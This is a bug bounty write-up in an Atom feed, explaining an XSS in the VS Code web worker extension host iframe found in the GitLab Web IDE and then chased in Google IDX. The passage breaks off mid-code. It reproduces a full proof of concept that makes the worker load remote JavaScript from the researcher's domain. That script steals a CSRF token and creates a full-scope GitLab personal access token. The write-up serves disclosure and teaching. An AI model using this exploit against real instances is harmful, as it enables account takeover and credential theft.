<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-07-31T13:36:30+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Your awesome title</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</subtitle><author><name>GitHub User</name><email>your-email@domain.com</email></author><entry><title type="html">XSS in Google IDX Workstation</title><link href="http://localhost:4000/2025/07/02/idx.html" rel="alternate" type="text/html" title="XSS in Google IDX Workstation" /><published>2025-07-02T00:00:00+05:30</published><updated>2025-07-02T00:00:00+05:30</updated><id>http://localhost:4000/2025/07/02/idx</id><content type="html" xml:base="http://localhost:4000/2025/07/02/idx.html"><![CDATA[<p>Heyyy Everyyonee,</p>

<p>In this blogpost I am going talk about one my bugs which I submitted to Google VRP last year. The report is disclosed publically but I really felt it‚Äôs hard to understand the inner working of the bug just based on the report I wanted to do a very detailed blogpost so here I am :)</p>

<p><br /></p>
<center><a href="https://bughunters.google.com/reports/vrp/fEFqSpwPf" class="card-preview" data-size="medium" target="_blank">
  Loading preview...
</a></center>
<p><br /></p>

<p>I will start first by explaining the original bug , how it happened what were the requirements where was the sink and all then talk about the one which I found in Google IDX. In case of IDX the vulnerable code path wasn‚Äôt used automatically like Gitlab so I had to manually frame/tweak and understand each messaage to make sure it reached the sink.</p>

<p>This bug was originally found by <a href="https://x.com/MtnBer">Matan Berson</a> (<em>an elite client security guy</em>) in Gitlab Web IDE component üôá‚Äç‚ôÄÔ∏è which under the hood uses Code OSS. As the core issue is in Code OSS itself this means any other target using the same can be vulnerable as well.</p>

<p><br /></p>
<center><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/461328" class="card-preview" data-size="medium" target="_blank">
  Loading preview...
</a></center>
<p><br /></p>

<p>To follow along the bug, I will setup a vulnerable version of Gitlab locally</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker run  <span class="nt">-it</span> <span class="nt">-p</span> 1337:80 gitlab/gitlab-ce:16.10.5-ce.0
<span class="nb">sudo </span>docker <span class="nb">exec</span> <span class="nt">-it</span> f4a36094670e <span class="nb">grep</span> <span class="s1">'Password:'</span> /etc/gitlab/initial_root_password
</code></pre></div></div>

<p>From there after login, open any repo then from Edit section choose open in Web IDE. From Devtool &gt; sources you should be able to see the following endpoint.</p>

<p><a href="http://127.0.0.1:1337/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html">http://127.0.0.1:1337/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html</a></p>

<p>Equivalent vulnerable endpoint in Gitlab looked looks like this: <a href="https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=">https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=</a></p>

<p>This endpoint has a <code class="language-plaintext highlighter-rouge">parentOrigin</code> parameter which is very important. If you look into the page source on how this parameter value is used</p>

<p><a href="https://github.com/microsoft/VSCode/blob/e61c1717783b8285829ae812e85a0408f713b459/src/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html#L16">https://github.com/microsoft/VSCode/blob/e61c1717783b8285829ae812e85a0408f713b459/src/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html#L16</a></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">parentOrigin</span> <span class="o">=</span> <span class="nx">searchParams</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">parentOrigin</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span> <span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>

<span class="p">[...]</span>
<span class="p">[...]</span>

<span class="nb">self</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">origin</span> <span class="o">!==</span> <span class="nx">parentOrigin</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">worker</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">ports</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>self refers to the window itself, so here it‚Äôs setting an event listener for the message event. But also we have an validation here regarding the origin. As the <code class="language-plaintext highlighter-rouge">parentOrigin</code> can be controlled directly via parameters this could be abused to input any arbitrary origin here and pass the check.</p>

<p>You can see if no such parameter is provided it would fallback to window.origin which would return gitlab.com only.</p>

<p>The above code block acts as a proxy as it forwards the same <em>postMessage</em> data received from the <code class="language-plaintext highlighter-rouge">parentOrigin</code> to the worker script. To give you an idea , this <em>webWorkerExtensionHostIframe.htm</em>l is related to the VSCode extensions, the worker handles the execution and all of the extensions related tasks.</p>

<p>All of these communication happens using <em>postMessage</em>, as we are able to send arbitrary messages through this to the worker things can get interesting.</p>

<p>Additionally we can see it also sends messages to the parent window so it suspects the endpoint is supposed to be inside iframe only.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">({</span>
                        <span class="nx">VSCodeWebWorkerExtHostId</span><span class="p">,</span>
                        <span class="nx">data</span>
                    <span class="p">},</span> <span class="nx">parentOrigin</span><span class="p">,</span> <span class="p">[</span><span class="nx">data</span><span class="p">]);</span>
</code></pre></div></div>

<p>Ok now we have little bit idea on the vulnerable component, lets move forward.</p>

<p>From the report we can get hold of a full working poc : <a href="https://peo.si/gl/editor/poc-frame.html">https://peo.si/gl/editor/poc-frame.html</a>
The domain name is pretty coool btw :p</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=https://peo.si"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="c1">// --- utils ---</span>
    <span class="kd">const</span> <span class="nx">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextDecoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">decode</span> <span class="o">=</span> <span class="nx">decoder</span><span class="p">.</span><span class="nx">decode</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">decoder</span><span class="p">)</span>

    <span class="kd">const</span> <span class="nx">encoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextEncoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">encode</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">encoder</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">str</span><span class="p">).</span><span class="nx">buffer</span>

    <span class="kd">function</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">hex</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nx">length</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nx">hex</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/</span><span class="se">[\d</span><span class="sr">a-f</span><span class="se">]{2}</span><span class="sr">/gi</span><span class="p">).</span><span class="nf">map</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
        <span class="p">})).</span><span class="nx">buffer</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">[...</span><span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)].</span><span class="nf">map</span><span class="p">(</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">)).</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">async</span> <span class="kd">function</span> <span class="nf">fetch_text</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">resp</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="c1">// --- end utils ---</span>

    <span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span> <span class="nf">add_port</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">window</span><span class="p">.</span><span class="nf">removeEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">add_port</span><span class="p">)</span>
            <span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nx">port</span>
            <span class="nx">port</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="nx">port_listener</span>
            <span class="nf">send_map</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">})</span>

    <span class="kd">function</span> <span class="nf">send_map</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Map</span><span class="p">()</span>
        <span class="kd">const</span> <span class="nx">channel</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MessageChannel</span><span class="p">()</span>
        <span class="nx">map</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">gitlab.gitlab-web-ide</span><span class="dl">"</span><span class="p">,</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">)</span>
        <span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">({</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">VSCode.init</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span> <span class="nx">map</span> <span class="p">},</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">])</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">false</span>
    <span class="kd">function</span> <span class="nf">port_listener</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span>
        <span class="c1">// console.log("%crecived: " + decode(rawmsg), "color: gray")</span>

        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">send_called</span> <span class="o">&amp;&amp;</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">02</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// The message is an init message</span>
            <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">true</span>
            <span class="nf">send_everything</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">sleep</span><span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">)</span>
        <span class="p">})</span>
    <span class="p">}</span>
    <span class="k">async</span> <span class="kd">function</span> <span class="nf">send_everything</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="dl">"</span><span class="s2">send_hex.txt</span><span class="dl">"</span><span class="p">)).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">)</span>
        <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
        <span class="k">for </span><span class="p">(</span><span class="nx">hex</span> <span class="k">of</span> <span class="nx">hex_lines</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span>
            <span class="c1">// console.log("%csent: " + decode(rawmsg), "color: gray")</span>
            <span class="nx">port</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span>
            <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>Let‚Äôs start with modifying the iframe src</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=https://peo.si"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<p>Eg for mine local instance it‚Äôs this http://127.0.0.1:1337/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=http://127.0.0.1:1338</p>

<p>Also you need to replace one thing, here the url is relative so make it absolute, well spoiler alert all the magic is happening inside this only ;)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fetch_text("https://peo.si/gl/editor/send_hex.txt")
</code></pre></div></div>

<p>In console you could see a message like this
<img src="/tmp/cdn-images/Pasted%20image%2020250714201326.png" alt="Pasted image 20250714201326.png" /></p>

<p>Which is from the following script</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span> <span class="nf">anonymous</span><span class="p">(</span><span class="nx">module</span><span class="p">,</span><span class="nx">exports</span><span class="p">,</span><span class="nx">require</span>
<span class="p">)</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">dir</span><span class="p">(</span><span class="dl">"</span><span class="s2">XSS in </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">origin</span><span class="p">)</span>
<span class="nx">globalThis</span><span class="p">.</span><span class="nx">fetch</span> <span class="o">=</span> <span class="nx">WorkerGlobalScope</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">fetch</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">globalThis</span><span class="p">)</span> <span class="c1">// restore original fetch</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">page_resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://gitlab.com/-/user_settings/personal_access_tokens</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">text</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">page_resp</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
    <span class="kd">const</span> <span class="nx">csrf_token</span> <span class="o">=</span> <span class="nx">text</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/&lt;meta name="csrf-token" content=".*</span><span class="se">?</span><span class="sr">"/g</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">dir</span><span class="p">(</span><span class="dl">"</span><span class="s2">Got csrf token: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">csrf_token</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">token_resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://gitlab.com/-/user_settings/personal_access_tokens</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">X-Csrf-Token</span><span class="dl">"</span><span class="p">:</span> <span class="nx">csrf_token</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
        <span class="p">},</span>
        <span class="na">body</span><span class="p">:</span> <span class="dl">"</span><span class="s2">personal_access_token%5Bname%5D=malicious%20token&amp;personal_access_token%5Bexpires_at%5D=2025-05-04&amp;personal_access_token%5Bscopes%5D%5B%5D=api&amp;personal_access_token%5Bscopes%5D%5B%5D=read_api&amp;personal_access_token%5Bscopes%5D%5B%5D=read_user&amp;personal_access_token%5Bscopes%5D%5B%5D=create_runner&amp;personal_access_token%5Bscopes%5D%5B%5D=k8s_proxy&amp;personal_access_token%5Bscopes%5D%5B%5D=read_repository&amp;personal_access_token%5Bscopes%5D%5B%5D=write_repository&amp;personal_access_token%5Bscopes%5D%5B%5D=read_registry&amp;personal_access_token%5Bscopes%5D%5B%5D=write_registry&amp;personal_access_token%5Bscopes%5D%5B%5D=ai_features</span><span class="dl">"</span>
    <span class="p">})</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">token_resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nx">new_token</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">dir</span><span class="p">(</span><span class="dl">"</span><span class="s2">Got token: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">token</span><span class="p">)</span>
<span class="p">}</span>

<span class="nf">exploit</span><span class="p">()</span>
<span class="c1">//# sourceURL=https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/extensions/gitlab-web-ide/main.js#VSCode-extension</span>
<span class="p">})</span>
</code></pre></div></div>

<p>This xss executes in the context of web worker which is different as you don‚Äôt have access to dom and other things. Still you can make use of things like fetch and read any sensitive data you want because the origin is same.</p>

<p>The above script comes from this file: <a href="https://peo.si/gl/editor/include.js">https://peo.si/gl/editor/include.js</a> but you might wonder where did it get loaded from, let‚Äôs look into the <em>send_hex.txt</em> data there are over 798 lines of hex data each one is individual and needs to be send as alone (one by one through the message port).</p>

<p>All these hex data are being transmitted to the worker script via the proxy <em>postMessage</em> handler which I talked earlier about. Matan also has placed additional utilities to decode/encode the hex data.</p>

<p>VSCode extension worker expects data in buffer format sending raw buffer can be tricky that‚Äôs why it‚Äôs stored in hex.</p>

<p>Comment out this line in the poc to see the decoded version of the data which we are sending:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="c1">// console.log("%csent: " + decode(rawmsg), "color: gray")</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201122.png" alt="Pasted image 20250714201122.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201147.png" alt="Pasted image 20250714201147.png" />
<br />
You can see some sample logging like this.</p>

<p>People with sharingan would have already noticed the interesting part , it has some non printable chars also before it. Btw just to point if you randomly change the hostname it‚Äôs not going to work the characters at the front also holds some meaning for eg the length I will talk about them later</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">sent:</span><span class="w">   </span><span class="err">O</span><span class="p">{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/gl/editor/include.js"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"https"</span><span class="p">,</span><span class="nl">"authority"</span><span class="p">:</span><span class="s2">"peo.si"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>which in hex is this</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>09000000110000004f7b22246d6964223a312c2270617468223a222f676c2f656469746f722f696e636c7564652e6a73222c22736368656d65223a226874747073222c22617574686f72697479223a2270656f2e7369227d
</code></pre></div></div>

<p>Matan did mentioned somewhere I forgot where  it was, he constructed all these <em>postMessage</em> data by setting breakpoint on those worker related message handlers. And made changes to the path authority part of that message which allowed him to load the arbitrary js from his own domain.</p>

<p>We now have a working poc and a bit of idea how it works, so we are good move on the next part.</p>

<h2 id="xss-in-google-idx">XSS in Google IDX</h2>

<p>During that time Google VRP announce something , they were paying 15k for a xss in XSS on idx.google.com</p>

<center><a href="https://bughunters.google.com/blog/5400513950908416/increasing-google-alphabet-vrp-rewards-up-to-151-515" class="card-preview" data-size="medium" target="_blank">
  Loading preview...
</a></center>

<p>As IDX is built on Code OOS itself it was great oppurtunity to check for the bug there. I quickly fired up a new instance grabbed the full url for that endpoint and loaded it inside an iframe.</p>

<p><a href="https://idx-test-1723049072870.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev/cde-b0e6fa075cda44c438f11d44d4466ea348722d00/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.esm.html?&amp;VSCodeWebWorkerExtHostId=651e8c71-0f38-4e7e-b9cb-0de00c82087b">https://idx-test-1723049072870.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev/cde-b0e6fa075cda44c438f11d44d4466ea348722d00/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.esm.html?&amp;VSCodeWebWorkerExtHostId=651e8c71-0f38-4e7e-b9cb-0de00c82087b</a></p>

<p>And very soon saw my first disappointment appeared :(</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frame-ancestors: 'self', https://80-idx-test-1723049072870.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev, https://idx-test-1723049072870.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev, https://monospace.corp.google.com, https://monospace-dev.corp.google.com, https://monospace-staging.corp.google.com, https://monospace-autopush.corp.google.com, https://msm.sandbox.google.com, https://monospace.sandbox.google.com, https://idx.sandbox.google.com, https://monospace.google.com, https://idx.google.com, https://studio.firebase.google.com, https://*.sslproxy.corp.google.com, https://*.cloudworkstations.googleusercontent.com, https://localhost.corp.google.com:10443
</code></pre></div></div>

<p>Just one thing was good with this was that it allowed a lot of other domains so a xss in any of these looked very promising. The most reliable was this <code class="language-plaintext highlighter-rouge">https://*.cloudworkstations.googleusercontent.com</code> but I had no idea from where I would lead to this, the name does suggest this domain is meant for hosting user controllable input.
So I contacted my Google vrp leet friend</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201210.png" alt="Pasted image 20250714201210.png" />
<img src="/tmp/cdn-images/Pasted%20image%2020250714201227.png" alt="Pasted image 20250714201227.png" />
<br />
By forcing Sreeram to put his ass at work:</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201252.png" alt="Pasted image 20250714201252.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201427.png" alt="Pasted image 20250714201427.png" />
<br />
<br /></p>

<p>And he did find one, now it was my turn to confirm the theory but it turned out that the same payload doesn‚Äôt works in IDX. It did felt like it should work but I have no idea to confirm the same, the only possible solution was to debug and understand Matan‚Äôs finding to identify the sink and flow to better understand the problem with IDX.</p>

<p>As I already mentioned Matan was able to get hold of those messages by setting logger for the message calls and later he replaced the server where the file was requested from to his own. I decided to do the same with IDX .</p>

<p>The very first thing I did was to shortened the payload from Matan‚Äôs poc, from 700 to mere 10 <em>postMessage</em> data.
First I removed the extra messages from the 59th line to the end, as the message  on the 58th line was instructing VSCode to load arbitrary js from attacker controlled domain (anything after that shouldn‚Äôt matter) and it did still worked so I knew I was on the right track. Then I manually removed here there until I had a very small list which was really important as I could understand what was necessary to trigger the bug and debug also why it‚Äôs failing on IDX</p>

<p>Remove one line at a time then refreshing the page to see it works or not
<img src="/tmp/cdn-images/hRpaEkH9mF.gif" alt="hRpaEkH9mF.gif" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715094955.png" alt="Pasted image 20250715094955.png" />
<br />
When I tried modyfing the hex data locally, it was all gibberish format when decoding it turns out the problem is with how Windows new lines differ from Linux os quick fix</p>

<p>In Linux based OS it‚Äôs supposed to be <code class="language-plaintext highlighter-rouge">\n</code> while in Windows it‚Äôs <code class="language-plaintext highlighter-rouge">\r\n</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="dl">"</span><span class="s2">send_hex.txt</span><span class="dl">"</span><span class="p">)).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Now as we have shortened the payload being sent we can debug side by side one tab for Gitlab and one tab for IDX and step by step debug where the code path changes.</p>

<hr />

<h2 id="deep-dive-into-vscode">Deep Dive into VSCode</h2>

<p>I also wanted to see the message logs from IDX to see if it had the same message which included the resource from where the extension were loaded.</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715112749.png" alt="Pasted image 20250715112749.png" />
<br />
Inside the worker script the message handling was done here, which decoded the buffer data
So I needed to hook this method and forward all the message eg to suppose a local web server which would append the data to a file.</p>

<p>You could do this with <a href="https://github.com/kevin-mizu/domloggerpp">domlogger++</a> also I believe but noob me couldn‚Äôt figure out (an awesome extension by  <a href="https://x.com/kevin_mizu">Kevin Mizu</a> , if you are into client side security do give it a try ) , so I fallback to match and replace option which worked really fine, it basically encodes the buffer data into hex then sends the data to a local web server which saves the result into a file.</p>

<p>I performed almost all actions to have proper logs I even installed some extensions from marketplace hoping the same would appear in logs.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Match</span>
<span class="k">return</span><span class="p">}</span><span class="nx">a</span><span class="p">.</span><span class="nf">fire</span><span class="p">(</span><span class="nx">h</span><span class="p">)</span>

<span class="nx">Replace</span>
